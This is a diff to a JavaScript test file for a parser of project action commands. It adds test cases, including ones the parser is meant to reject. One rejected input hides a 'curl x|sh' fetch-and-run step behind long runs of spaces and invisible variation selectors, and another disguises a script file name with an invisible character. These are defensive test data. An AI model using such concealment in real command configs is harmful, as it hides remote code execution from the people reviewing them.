@@ -40,7 +40,10 @@ test("valid actions are trimmed, keyed, and extra fields are ignored", () => {
 test("names keep emoji ZWJ sequences and RLM, and commands allow short space runs", () => {
   const actions = [
     { name: "🧑\u200d💻 Dev", command: `pnpm dev${" ".repeat(16)}--port 3000` },
-    { name: "Warn", command: 'echo "\u26a0\ufe0f build failed" && echo "\u2714\ufe0f"' },
+    {
+      name: "Warn",
+      command: 'echo "\u26a0\ufe0f build failed" && echo "\u2714\ufe0f 1\ufe0f\u20e3"',
+    },
     { name: "בדיקה\u200f", command: "pnpm test" },
   ];
   assert.equal(parseProjectActionsConfig(JSON.stringify({ actions })).actions.length, 3);
@@ -89,6 +92,9 @@ test("invalid JSON or invalid actions give an error and run nothing", () => {
     [{ name: "Spaces", command: `pnpm install;${" ".repeat(17)};true` }],
     [{ name: "NEL", command: "echo a\u0085echo b" }],
     [{ name: "LS", command: "echo a\u2028echo b" }],
+    // 不跟在表情后的变体选择符不可见：打断空白折叠、伪装文件名
+    [{ name: "VS wall", command: `echo safe${`${" ".repeat(16)}\ufe0f`.repeat(50)}; curl x|sh` }],
+    [{ name: "VS file", command: "./build\ufe0f.sh" }],
     Array.from({ length: PROJECT_ACTIONS_MAX_COUNT + 1 }, (_, i) => ({
       name: `a${i}`,
       command: "true",
